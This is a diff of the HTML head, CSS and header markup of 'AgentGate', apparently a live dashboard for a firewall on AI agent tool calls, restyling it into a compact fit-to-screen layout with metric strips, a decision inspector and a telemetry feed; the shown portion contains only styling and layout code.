@@ -3,17 +3,17 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>AgentGate — Interactive Security Firewall & Live Dashboard</title>
+<title>AgentGate — Live Security Firewall Cockpit &amp; Telemetry</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@500;600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
     --bg-base: #030805;
-    --panel-bg: rgba(15, 23, 42, 0.78);
-    --panel-border: rgba(255, 255, 255, 0.1);
-    --panel-border-hover: rgba(56, 189, 248, 0.5);
-    --panel-sub: rgba(11, 17, 32, 0.94);
+    --panel-bg: rgba(13, 20, 36, 0.88);
+    --panel-border: rgba(255, 255, 255, 0.08);
+    --panel-border-hover: rgba(56, 189, 248, 0.4);
+    --panel-sub: rgba(9, 14, 26, 0.95);
     
     --text-main: #ffffff;
     --text-muted: #94a3b8;
@@ -21,27 +21,28 @@
     
     --primary: #38bdf8;
     --primary-bright: #67e8f9;
-    --primary-glow: rgba(56, 189, 248, 0.3);
+    --primary-glow: rgba(56, 189, 248, 0.25);
     --primary-gradient: linear-gradient(135deg, #38bdf8 0%, #818cf8 100%);
     
     --green: #10b981;
     --green-bright: #34d399;
-    --green-glow: rgba(16, 185, 129, 0.35);
+    --green-glow: rgba(16, 185, 129, 0.25);
     --green-gradient: linear-gradient(135deg, #10b981 0%, #34d399 100%);
     
     --red: #f43f5e;
     --red-bright: #fb7185;
-    --red-glow: rgba(244, 63, 94, 0.35);
+    --red-glow: rgba(244, 63, 94, 0.25);
     --red-gradient: linear-gradient(135deg, #f43f5e 0%, #fb7185 100%);
     
     --amber: #f59e0b;
     --amber-bright: #fbbf24;
-    --amber-glow: rgba(245, 158, 11, 0.35);
+    --amber-glow: rgba(245, 158, 11, 0.25);
     --amber-gradient: linear-gradient(135deg, #f59e0b 0%, #fbbf24 100%);
     
     --purple: #a855f7;
     --purple-bright: #c084fc;
-    --purple-glow: rgba(168, 85, 247, 0.35);
+    --purple-glow: rgba(168, 85, 247, 0.25);
+    --purple-gradient: linear-gradient(135deg, #a855f7 0%, #c084fc 100%);
 
     --font-head: 'Outfit', sans-serif;
     --font-body: 'Plus Jakarta Sans', sans-serif;
@@ -53,107 +54,120 @@
   body {
     background-color: var(--bg-base);
     background-image: 
-      radial-gradient(circle at 10% 12%, rgba(16, 185, 129, 0.15) 0%, transparent 45%),
-      radial-gradient(circle at 90% 18%, rgba(56, 189, 248, 0.14) 0%, transparent 40%),
-      radial-gradient(circle at 50% 85%, rgba(168, 85, 247, 0.09) 0%, transparent 50%),
+      radial-gradient(circle at 12% 10%, rgba(16, 185, 129, 0.12) 0%, transparent 40%),
+      radial-gradient(circle at 88% 15%, rgba(56, 189, 248, 0.1) 0%, transparent 40%),
+      radial-gradient(circle at 50% 90%, rgba(168, 85, 247, 0.07) 0%, transparent 50%),
       linear-gradient(180deg, #030805 0%, #020403 100%);
     background-attachment: fixed;
     color: var(--text-main);
     font-family: var(--font-body);
-    font-size: 14px;
-    line-height: 1.5;
-    min-height: 100vh;
-    padding: 16px 20px 60px;
+    font-size: 12.5px;
+    line-height: 1.35;
+    height: 100vh;
+    width: 100vw;
+    padding: 10px 16px;
+    overflow: hidden; /* Strict fit-to-screen: no page-level scrolling */
   }
 
-  .container {
-    max-width: 1400px;
+  .app-layout {
+    max-width: 1600px;
+    height: 100%;
     margin: 0 auto;
     display: flex;
     flex-direction: column;
-    gap: 20px;
+    gap: 10px;
   }
 
-  /* Header Bar */
+  /* Compact Top Header */
   header {
     background: var(--panel-bg);
-    backdrop-filter: blur(24px) saturate(190%);
+    backdrop-filter: blur(20px) saturate(180%);
+    -webkit-backdrop-filter: blur(20px);
     border: 1px solid var(--panel-border);
-    border-radius: 18px;
-    padding: 14px 24px;
+    border-radius: 10px;
+    padding: 6px 14px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    gap: 16px;
-    flex-wrap: wrap;
-    box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5);
+    gap: 10px;
+    flex-shrink: 0;
   }
 
   .brand-group {
     display: flex;
     align-items: center;
-    gap: 12px;
+    gap: 8px;
   }
 
   .logo-shield {
-    width: 38px;
-    height: 38px;
-    border-radius: 10px;
-    background: linear-gradient(135deg, rgba(16, 185, 129, 0.25), rgba(56, 189, 248, 0.25));
-    border: 1px solid rgba(56, 189, 248, 0.4);
+    width: 24px;
+    height: 24px;
+    border-radius: 6px;
+    background: linear-gradient(135deg, rgba(16, 185, 129, 0.3), rgba(56, 189, 248, 0.3));
+    border: 1px solid rgba(56, 189, 248, 0.5);
     display: flex;
     align-items: center;
     justify-content: center;
-    box-shadow: 0 0 16px rgba(56, 189, 248, 0.3);
   }
 
   .brand-title {
     font-family: var(--font-head);
-    font-size: 20px;
+    font-size: 16px;
     font-weight: 800;
-    letter-spacing: -0.02em;
     color: #ffffff;
     display: flex;
     align-items: center;
-    gap: 10px;
+    gap: 8px;
+    letter-spacing: -0.02em;
   }
 
   .chip-tag {
     font-family: var(--font-mono);
-    font-size: 11px;
+    font-size: 9.5px;
     font-weight: 700;
     text-transform: uppercase;
-    letter-spacing: 0.08em;
-    padding: 3px 10px;
+    padding: 1.5px 7px;
     border-radius: 999px;
-    background: rgba(56, 189, 248, 0.15);
+    background: rgba(56, 189, 248, 0.12);
     color: #38bdf8;
-    border: 1px solid rgba(56, 189, 248, 0.35);
+    border: 1px solid rgba(56, 189, 248, 0.3);
   }
 
   .nav-actions {
     display: flex;
     align-items: center;
-    gap: 16px;
-    flex-wrap: wrap;
+    gap: 10px;
+  }
+
+  .backend-badge {
+    font-family: var(--font-mono);
+    font-size: 10.5px;
+    color: #38bdf8;
+    background: rgba(56, 189, 248, 0.08);
+    border: 1px solid rgba(56, 189, 248, 0.22);
+    padding: 3px 8px;
+    border-radius: 5px;
+    display: flex;
+    align-items: center;
+    gap: 5px;
   }
 
   .live-status {
     display: flex;
     align-items: center;
-    gap: 8px;
-    background: rgba(16, 185, 129, 0.15);
-    border: 1px solid rgba(16, 185, 129, 0.35);
-    padding: 6px 14px;
+    gap: 6px;
+    background: rgba(16, 185, 129, 0.12);
+    border: 1px solid rgba(16, 185, 129, 0.3);
+    padding: 3px 9px;
     border-radius: 999px;
     color: #34d399;
-    font-size: 12px;
+    font-size: 10.5px;
     font-weight: 700;
   }
 
   .radar-dot {
-    width: 8px;
-    height: 8px;
+    width: 6px;
+    height: 6px;
     border-radius: 50%;
     background: #34d399;
     position: relative;
@@ -162,9 +176,9 @@
   .radar-dot::after {
     content: '';
     position: absolute;
-    top: -4px; left: -4px; right: -4px; bottom: -4px;
+    top: -3px; left: -3px; right: -3px; bottom: -3px;
     border-radius: 50%;
-    border: 2px solid #34d399;
+    border: 1.5px solid #34d399;
     animation: radar-ripple 1.8s infinite cubic-bezier(0, 0.2, 0.8, 1);
   }
 
@@ -176,78 +190,89 @@
   .home-link {
     color: var(--text-muted);
     text-decoration: none;
-    font-size: 13px;
+    font-size: 11.5px;
     font-weight: 600;
-    transition: all 0.2s ease;
-    display: flex;
-    align-items: center;
-    gap: 6px;
+    padding: 3px 8px;
+    border-radius: 5px;
+    transition: all 0.15s ease;
   }
+  .home-link:hover { color: #fff; background: rgba(255,255,255,0.05); }
 
-  .home-link:hover { color: var(--primary); }
-
-  /* Interactive Command Control Center */
-  .control-center {
+  /* Compact Command Control & 2D Pipeline Console */
+  .cockpit-card {
     background: var(--panel-bg);
-    backdrop-filter: blur(24px) saturate(190%);
+    backdrop-filter: blur(20px) saturate(180%);
+    -webkit-backdrop-filter: blur(20px);
     border: 1px solid var(--panel-border);
-    border-radius: 18px;
-    padding: 18px 24px;
+    border-radius: 12px;
+    padding: 10px 14px;
     display: flex;
     flex-direction: column;
-    gap: 14px;
-    box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5);
+    gap: 8px;
+    flex-shrink: 0;
   }
 
-  .control-top {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 12px;
-  }
-
-  .control-label {
-    font-family: var(--font-head);
-    font-size: 16px;
-    font-weight: 800;
+  .control-row {
     display: flex;
     align-items: center;
     gap: 8px;
-    color: #fff;
-  }
-
-  .control-bar {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    flex-wrap: wrap;
   }
 
   .script-select {
     flex: 1;
-    min-width: 300px;
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
-    border-radius: 10px;
-    padding: 12px 16px;
+    border-radius: 7px;
+    padding: 6px 10px;
     color: #fff;
     font-family: var(--font-mono);
-    font-size: 13px;
+    font-size: 11.5px;
     outline: none;
     cursor: pointer;
-    transition: all 0.2s ease;
   }
 
-  .script-select:hover, .script-select:focus {
+  .script-select:focus {
     border-color: var(--primary);
-    box-shadow: 0 0 14px rgba(56, 189, 248, 0.2);
+    box-shadow: 0 0 10px rgba(56, 189, 248, 0.2);
   }
 
   .script-select option {
     background: #0b1120;
     color: #fff;
-    padding: 8px;
+  }
+
+  .custom-cmd-input {
+    flex: 0.8;
+    background: var(--panel-sub);
+    border: 1px solid var(--panel-border);
+    border-radius: 7px;
+    padding: 6px 10px;
+    color: #fff;
+    font-family: var(--font-mono);
+    font-size: 11.5px;
+    outline: none;
+    display: none;
+  }
+  .custom-cmd-input:focus {
+    border-color: var(--primary);
+    box-shadow: 0 0 10px rgba(56, 189, 248, 0.2);
+  }
+
+  .btn-mode-toggle {
+    background: var(--panel-sub);
+    border: 1px solid var(--panel-border);
+    color: var(--text-muted);
+    font-size: 11px;
+    font-weight: 600;
+    padding: 6px 10px;
+    border-radius: 7px;
+    cursor: pointer;
+    white-space: nowrap;
+    transition: all 0.15s ease;
+  }
+  .btn-mode-toggle:hover {
+    color: #fff;
+    border-color: var(--panel-border-hover);
   }
 
   .btn-fire {
@@ -255,409 +280,336 @@
     color: #041019;
     font-family: var(--font-head);
     font-weight: 800;
-    font-size: 14px;
-    padding: 12px 26px;
-    border-radius: 10px;
+    font-size: 12px;
+    padding: 7px 16px;
+    border-radius: 7px;
     border: none;
     cursor: pointer;
     display: flex;
     align-items: center;
-    gap: 8px;
-    box-shadow: 0 0 20px rgba(16, 185, 129, 0.4);
-    transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+    gap: 6px;
+    box-shadow: 0 0 14px rgba(16, 185, 129, 0.3);
     white-space: nowrap;
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
   }
 
-  .btn-fire:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 6px 26px rgba(56, 189, 248, 0.5);
-  }
+  .btn-fire:hover { transform: translateY(-1px); box-shadow: 0 0 20px rgba(16, 185, 129, 0.45); }
+  .btn-fire:active { transform: translateY(0); }
 
-  .btn-fire:active {
-    transform: translateY(0);
-  }
-
-  /* Metric Cards Grid */
-  .cards-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-    gap: 16px;
-  }
-
-  .stat-card {
-    background: var(--panel-bg);
-    backdrop-filter: blur(20px) saturate(180%);
-    border: 1px solid var(--panel-border);
-    border-radius: 16px;
-    padding: 18px 20px;
-    position: relative;
-    overflow: hidden;
-    transition: all 0.25s ease;
-  }
-
-  .stat-card:hover {
-    transform: translateY(-2px);
-    border-color: var(--panel-border-hover);
-  }
-
-  .stat-card::before {
-    content: '';
-    position: absolute;
-    top: 0; left: 0; right: 0;
-    height: 3px;
-    background: var(--primary-gradient);
-  }
-
-  .stat-card.ok::before { background: var(--green-gradient); }
-  .stat-card.bad::before { background: var(--red-gradient); }
-  .stat-card.warn::before { background: var(--amber-gradient); }
-  .stat-card.purple::before { background: var(--purple-gradient); }
-
-  .stat-header {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    margin-bottom: 6px;
-  }
-
-  .stat-title {
-    font-size: 11px;
-    font-weight: 700;
-    text-transform: uppercase;
-    letter-spacing: 0.08em;
-    color: var(--text-muted);
-  }
-
-  .stat-num {
-    font-family: var(--font-head);
-    font-size: 30px;
-    font-weight: 800;
-    letter-spacing: -0.03em;
-    line-height: 1.1;
-    color: #fff;
-  }
-
-  .stat-sub {
-    font-size: 11.5px;
-    color: var(--text-dim);
-    margin-top: 4px;
-  }
-
-  /* 2D Interactive Architecture Model */
-  .arch-section {
-    background: var(--panel-bg);
-    backdrop-filter: blur(24px) saturate(190%);
-    border: 1px solid var(--panel-border);
-    border-radius: 20px;
-    padding: 22px 24px;
-    display: flex;
-    flex-direction: column;
-    gap: 16px;
-    box-shadow: 0 12px 36px -12px rgba(0, 0, 0, 0.6);
-  }
-
-  .arch-header {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 10px;
-  }
-
-  .arch-title {
-    font-family: var(--font-head);
-    font-size: 17px;
-    font-weight: 800;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-
+  /* 2D Visual Pipeline Flow */
   .pipeline-flow {
     display: flex;
     align-items: center;
     justify-content: space-between;
-    gap: 8px;
-    overflow-x: auto;
-    padding: 10px 0;
+    gap: 5px;
+    padding: 2px 0;
   }
 
   .pipe-node {
     flex: 1;
-    min-width: 135px;
+    min-width: 0;
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
-    border-radius: 14px;
-    padding: 14px 10px;
+    border-radius: 8px;
+    padding: 6px 4px;
     display: flex;
     flex-direction: column;
     align-items: center;
     text-align: center;
-    gap: 6px;
-    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-    position: relative;
-    box-shadow: 0 4px 14px rgba(0, 0, 0, 0.4);
+    gap: 2px;
+    transition: all 0.22s cubic-bezier(0.16, 1, 0.3, 1);
   }
 
   .pipe-node.active {
     border-color: var(--primary);
-    box-shadow: 0 0 24px rgba(56, 189, 248, 0.45), inset 0 0 12px rgba(56, 189, 248, 0.2);
-    transform: translateY(-4px) scale(1.03);
+    box-shadow: 0 0 14px rgba(56, 189, 248, 0.4), inset 0 0 6px rgba(56, 189, 248, 0.2);
+    transform: translateY(-2px);
   }
 
   .pipe-node.blocked {
     border-color: var(--red);
-    box-shadow: 0 0 24px rgba(244, 63, 94, 0.5), inset 0 0 12px rgba(244, 63, 94, 0.25);
-    transform: translateY(-4px) scale(1.03);
+    box-shadow: 0 0 14px rgba(244, 63, 94, 0.5), inset 0 0 6px rgba(244, 63, 94, 0.25);
+    transform: translateY(-2px);
   }
 
   .pipe-node.passed {
     border-color: var(--green);
-    box-shadow: 0 0 24px rgba(16, 185, 129, 0.45), inset 0 0 12px rgba(16, 185, 129, 0.2);
+    box-shadow: 0 0 14px rgba(16, 185, 129, 0.4);
   }
 
   .pipe-node.review {
     border-color: var(--amber);
-    box-shadow: 0 0 24px rgba(245, 158, 11, 0.5), inset 0 0 12px rgba(245, 158, 11, 0.25);
-    transform: translateY(-4px) scale(1.03);
+    box-shadow: 0 0 14px rgba(245, 158, 11, 0.5);
+    transform: translateY(-2px);
   }
 
   .node-icon {
-    width: 34px;
-    height: 34px;
-    border-radius: 9px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 17px;
-    background: rgba(255, 255, 255, 0.05);
-    border: 1px solid var(--panel-border);
+    font-size: 13px;
+    line-height: 1;
   }
 
   .node-name {
     font-family: var(--font-head);
-    font-size: 13px;
+    font-size: 11px;
     font-weight: 700;
+    white-space: nowrap;
   }
 
   .node-role {
-    font-size: 10.5px;
+    font-size: 9px;
     color: var(--text-dim);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    max-width: 95%;
   }
 
   .flow-arrow {
-    display: flex;
-    align-items: center;
-    justify-content: center;
     color: var(--text-dim);
-    font-size: 16px;
-    user-select: none;
+    font-size: 12px;
     transition: all 0.2s ease;
+    flex-shrink: 0;
   }
 
   .flow-arrow.active {
     color: var(--primary-bright);
-    filter: drop-shadow(0 0 8px var(--primary-glow));
-    transform: scale(1.3);
+    filter: drop-shadow(0 0 5px var(--primary));
+    transform: scale(1.25);
   }
 
-  /* Two Column Main Workspace */
-  .main-workspace {
+  /* Compact Metric Cards Strip */
+  .metrics-strip {
     display: grid;
-    grid-template-columns: 1.15fr 0.85fr;
-    gap: 20px;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 8px;
+    flex-shrink: 0;
   }
 
-  @media (max-width: 1080px) {
-    .main-workspace { grid-template-columns: 1fr; }
-  }
-
-  /* Decision Breakdown Card */
-  .breakdown-card {
+  .metric-box {
     background: var(--panel-bg);
-    backdrop-filter: blur(24px) saturate(190%);
     border: 1px solid var(--panel-border);
-    border-radius: 20px;
-    padding: 24px;
+    border-radius: 9px;
+    padding: 6px 12px;
     display: flex;
     flex-direction: column;
-    gap: 16px;
-    box-shadow: 0 12px 36px -12px rgba(0, 0, 0, 0.6);
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
   }
 
-  .breakdown-header {
+  .metric-box::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: var(--primary-gradient);
+  }
+
+  .metric-box.ok::before { background: var(--green-gradient); }
+  .metric-box.bad::before { background: var(--red-gradient); }
+  .metric-box.purple::before { background: var(--purple-gradient); }
+  .metric-box.warn::before { background: var(--amber-gradient); }
+
+  .metric-lbl {
+    font-size: 9.5px;
+    font-weight: 700;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    letter-spacing: 0.02em;
+  }
+
+  .metric-val {
+    font-family: var(--font-head);
+    font-size: 18px;
+    font-weight: 800;
+    color: #fff;
+    line-height: 1.1;
+  }
+
+  /* Main Two-Column Split Workspace (Fills Remaining Viewport Exactly) */
+  .main-split {
+    display: grid;
+    grid-template-columns: 1.12fr 0.88fr;
+    gap: 10px;
+    flex: 1;
+    min-height: 0; /* Critical: allows flex child to scroll internally without overflowing viewport */
+  }
+
+  /* Left Panel: Active Decision Inspector */
+  .inspector-card {
+    background: var(--panel-bg);
+    backdrop-filter: blur(20px) saturate(180%);
+    -webkit-backdrop-filter: blur(20px);
+    border: 1px solid var(--panel-border);
+    border-radius: 12px;
+    padding: 10px 14px;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    min-height: 0;
+    overflow: hidden;
+  }
+
+  .inspector-header {
     display: flex;
     align-items: center;
     justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 10px;
-    padding-bottom: 12px;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    padding-bottom: 6px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+    flex-shrink: 0;
   }
 
-  .verdict-tag {
+  .verdict-badge {
     font-family: var(--font-mono);
-    font-size: 13px;
+    font-size: 10.5px;
     font-weight: 800;
-    padding: 5px 14px;
-    border-radius: 8px;
+    padding: 2.5px 9px;
+    border-radius: 5px;
     text-transform: uppercase;
-    letter-spacing: 0.06em;
   }
 
-  .verdict-tag.block { background: rgba(244, 63, 94, 0.2); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.4); box-shadow: 0 0 14px rgba(244, 63, 94, 0.25); }
-  .verdict-tag.allow { background: rgba(16, 185, 129, 0.2); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.4); box-shadow: 0 0 14px rgba(16, 185, 129, 0.25); }
-  .verdict-tag.review { background: rgba(245, 158, 11, 0.2); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.4); box-shadow: 0 0 14px rgba(245, 158, 11, 0.25); }
+  .verdict-badge.block { background: rgba(244, 63, 94, 0.2); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.4); }
+  .verdict-badge.rate_limited { background: rgba(244, 63, 94, 0.2); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.4); }
+  .verdict-badge.allow { background: rgba(16, 185, 129, 0.2); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.4); }
+  .verdict-badge.review { background: rgba(245, 158, 11, 0.2); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.4); }
 
-  .breakdown-details {
+  .breakdown-grid {
     display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-    gap: 14px;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 6px;
+    flex-shrink: 0;
   }
 
-  .detail-col {
+  .breakdown-item {
+    background: var(--panel-sub);
+    border: 1px solid var(--panel-border);
+    border-radius: 7px;
+    padding: 5px 8px;
     display: flex;
     flex-direction: column;
-    gap: 4px;
+    gap: 1px;
   }
 
-  .detail-label {
-    font-size: 10.5px;
+  .item-lbl {
+    font-size: 9px;
     color: var(--text-dim);
-    text-transform: uppercase;
     font-weight: 700;
+    text-transform: uppercase;
   }
 
-  .detail-val {
+  .item-val {
     font-family: var(--font-mono);
-    font-size: 13px;
+    font-size: 11px;
     color: #e2e8f0;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
   }
 
-  .rationale-text {
-    font-size: 13.5px;
-    color: #e2e8f0;
+  .rationale-box {
     background: var(--panel-sub);
-    padding: 12px 16px;
-    border-radius: 10px;
-    border-left: 3px solid var(--primary);
     border: 1px solid var(--panel-border);
+    border-left: 3px solid var(--primary);
+    border-radius: 7px;
+    padding: 6px 10px;
+    font-size: 11.5px;
+    color: #e2e8f0;
+    flex-shrink: 0;
   }
 
-  /* Interactive Human Approval Box (When Review Needed) */
   .hitl-box {
     display: none;
     background: rgba(245, 158, 11, 0.12);
     border: 1px solid rgba(245, 158, 11, 0.35);
-    border-radius: 12px;
-    padding: 14px 18px;
-    display: flex;
+    border-radius: 7px;
+    padding: 6px 10px;
     align-items: center;
     justify-content: space-between;
-    gap: 12px;
-    flex-wrap: wrap;
-  }
-
-  .hitl-actions {
-    display: flex;
     gap: 8px;
+    flex-shrink: 0;
   }
 
-  .btn-hitl-allow {
-    background: #10b981;
-    color: #041019;
+  .btn-hitl {
+    padding: 3px 9px;
+    border-radius: 4px;
     font-weight: 700;
-    padding: 6px 14px;
-    border-radius: 6px;
+    font-size: 10.5px;
     border: none;
     cursor: pointer;
-    font-size: 12px;
   }
 
-  .btn-hitl-deny {
-    background: #f43f5e;
-    color: #fff;
-    font-weight: 700;
-    padding: 6px 14px;
-    border-radius: 6px;
-    border: none;
-    cursor: pointer;
-    font-size: 12px;
-  }
-
-  /* Code Window Preview */
-  .code-preview {
+  .code-viewer {
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
+    border-radius: 7px;
+    overflow: hidden;
+    flex: 1;
+    min-height: 0;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .code-viewer-head {
+    background: rgba(255, 255, 255, 0.02);
+    border-bottom: 1px solid var(--panel-border);
+    padding: 4px 8px;
+    font-family: var(--font-mono);
+    font-size: 9.5px;
+    color: var(--text-dim);
+    display: flex;
+    justify-content: space-between;
+    flex-shrink: 0;
+  }
+
+  pre.code-viewer-body {
+    padding: 6px 8px;
+    font-family: var(--font-mono);
+    font-size: 10.5px;
+    color: #e2e8f0;
+    overflow: auto;
+    flex: 1;
+    margin: 0;
+    line-height: 1.35;
+  }
+
+  /* Right Panel: Telemetry Feed */
+  .telemetry-card {
+    background: var(--panel-bg);
+    backdrop-filter: blur(20px) saturate(180%);
+    -webkit-backdrop-filter: blur(20px);
+    border: 1px solid var(--panel-border);
     border-radius: 12px;
+    padding: 10px 14px;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    min-height: 0;
     overflow: hidden;
   }
 
-  .code-preview-header {
-    background: rgba(255, 255, 255, 0.03);
-    border-bottom: 1px solid var(--panel-border);
-    padding: 8px 14px;
-    font-family: var(--font-mono);
-    font-size: 11px;
-    color: var(--text-dim);
+  .telemetry-head {
     display: flex;
     align-items: center;
     justify-content: space-between;
+    padding-bottom: 6px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+    flex-shrink: 0;
   }
 
-  pre.code-preview-body {
-    padding: 14px;
-    font-family: var(--font-mono);
-    font-size: 12.5px;
-    color: #e2e8f0;
-    overflow-x: auto;
-    white-space: pre-wrap;
-  }
-
-  /* Live Stream Feed Card */
-  .stream-card {
-    background: var(--panel-bg);
-    backdrop-filter: blur(24px) saturate(190%);
-    border: 1px solid var(--panel-border);
-    border-radius: 20px;
-    padding: 24px;
+  .feed-filters {
     display: flex;
-    flex-direction: column;
-    gap: 16px;
-    box-shadow: 0 12px 36px -12px rgba(0, 0, 0, 0.6);
-  }
-
-  .stream-header {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 10px;
-  }
-
-  .stream-title {
-    font-family: var(--font-head);
-    font-size: 17px;
-    font-weight: 800;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-
-  .filter-group {
-    display: flex;
-    gap: 6px;
+    gap: 4px;
   }
 
   .filter-btn {
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
-    border-radius: 6px;
-    padding: 4px 10px;
-    font-size: 11.5px;
+    border-radius: 4px;
+    padding: 2px 7px;
+    font-size: 10px;
     color: var(--text-muted);
     cursor: pointer;
-    transition: all 0.2s ease;
+    transition: all 0.15s ease;
   }
 
   .filter-btn.active, .filter-btn:hover {
@@ -666,140 +618,118 @@
     color: #38bdf8;
   }
 
-  .feed-table {
+  .telemetry-table {
     display: flex;
     flex-direction: column;
-    gap: 6px;
-    max-height: 480px;
+    gap: 4px;
     overflow-y: auto;
+    flex: 1;
+    min-height: 0;
+    padding-right: 2px;
   }
 
   .feed-row {
     background: var(--panel-sub);
     border: 1px solid var(--panel-border);
-    border-radius: 8px;
-    padding: 8px 12px;
+    border-radius: 5px;
+    padding: 5px 8px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    gap: 10px;
-    font-size: 12.5px;
-    transition: all 0.2s ease;
-    animation: row-in 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    gap: 6px;
+    font-size: 11px;
+    animation: row-in 0.22s ease;
+    flex-shrink: 0;
   }
 
   @keyframes row-in {
-    0% { opacity: 0; transform: translateY(-6px); }
+    0% { opacity: 0; transform: translateY(-3px); }
     100% { opacity: 1; transform: translateY(0); }
-  }
-
-  .feed-row:hover {
-    border-color: var(--panel-border-hover);
-    background: rgba(15, 23, 42, 0.9);
-  }
-
-  .feed-left {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    overflow: hidden;
   }
 
   .feed-tag {
     font-family: var(--font-mono);
-    font-size: 10px;
+    font-size: 9px;
     font-weight: 700;
     text-transform: uppercase;
-    padding: 2px 6px;
-    border-radius: 4px;
-    white-space: nowrap;
+    padding: 1.5px 5px;
+    border-radius: 3px;
+    flex-shrink: 0;
   }
 
   .feed-tag.blocked { background: rgba(244, 63, 94, 0.2); color: #fb7185; }
   .feed-tag.response { background: rgba(16, 185, 129, 0.2); color: #34d399; }
   .feed-tag.redacted { background: rgba(168, 85, 247, 0.2); color: #c084fc; }
-  .feed-tag.request { background: rgba(56, 189, 248, 0.2); color: #38bdf8; }
+  .feed-tag.review { background: rgba(245, 158, 11, 0.2); color: #fbbf24; }
 
   .feed-tool {
     font-family: var(--font-mono);
     font-weight: 700;
     color: #fff;
+    flex-shrink: 0;
   }
 
   .feed-args {
     font-family: var(--font-mono);
     color: var(--text-dim);
-    font-size: 11.5px;
+    font-size: 10px;
     white-space: nowrap;
     overflow: hidden;
     text-overflow: ellipsis;
-    max-width: 240px;
+    max-width: 220px;
   }
 
-  .feed-right {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    font-family: var(--font-mono);
-    font-size: 11px;
-    color: var(--text-dim);
-    white-space: nowrap;
-  }
+  /* Custom scrollbar styling */
+  ::-webkit-scrollbar { width: 5px; height: 5px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.15); border-radius: 999px; }
+  ::-webkit-scrollbar-thumb:hover { background: rgba(255, 255, 255, 0.3); }
 </style>
 </head>
 <body>
 
-<div class="container">
+<div class="app-layout">
 
-  <!-- Header Bar -->
+  <!-- Compact Top Header -->
   <header>
     <div class="brand-group">
       <div class="logo-shield">
-        <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none">
           <path d="M12 2 4 5v6c0 5 3.4 9.6 8 11 4.6-1.4 8-6 8-11V5l-8-3Z" stroke="#38bdf8" stroke-width="2" stroke-linejoin="round"/>
           <path d="m9 12 2 2 4-4" stroke="#34d399" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
       </div>
       <div class="brand-title">
-        AgentGate <span class="chip-tag">Live Firewall</span>
+        AgentGate <span class="chip-tag">Live Firewall Cockpit</span>
       </div>
     </div>
     
     <div class="nav-actions">
+      <div class="backend-badge" title="Go In-Memory Regex & AST Engine running in microsecond latency">
+        <span>⚡</span> Go Engine Active (Real-Time)
+      </div>
       <div class="live-status">
         <div class="radar-dot"></div>
-        <span id="conn-state">READY ON DEMAND</span>
+        <span id="conn-state">CONNECTED (SSE)</span>
       </div>
-      <a class="home-link" href="/">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-        Landing Page
-      </a>
+      <a class="home-link" href="/">Landing Page ↗</a>
     </div>
   </header>
 
-  <!-- Interactive Control Bar: Select Script & Fire Button -->
-  <div class="control-center">
-    <div class="control-top">
-      <div class="control-label">
-        <span>⚡</span> Interactive Firewall Sandbox — Select &amp; Run Test Script
-      </div>
